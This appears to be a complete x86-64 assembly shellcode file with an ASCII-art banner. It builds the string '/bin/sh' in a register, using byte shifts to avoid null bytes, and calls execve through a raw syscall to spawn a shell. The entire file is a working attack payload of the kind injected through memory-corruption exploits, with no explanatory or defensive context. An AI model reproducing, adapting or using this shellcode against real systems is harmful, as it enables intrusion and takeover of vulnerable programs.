#                     .g8888bgd 
#                   .dP       M 
# ,pP"Ybd  ,pW8Wq.  dM        ; 
# 8I      6W     Wb MM          
#  YMMMa. 8M     M8 MM.         
# L.   I8 YA.   ,A9  Mb.     , 
# M9mmmP;  .Ybmd9.    ..bmmmd.

.section .data 
.section .text
.globl _start
_start:
xor %rsi, %rsi
xor %rdx, %rdx
movq $0x1168732f6e69622f, %rbx
shl $0x08, %rbx
shr $0x08, %rbx
pushq %rbx
mov $0x1111113b, %rax
movq %rsp, %rdi
shl $0x38, %rax
shr $0x38, %rax
syscall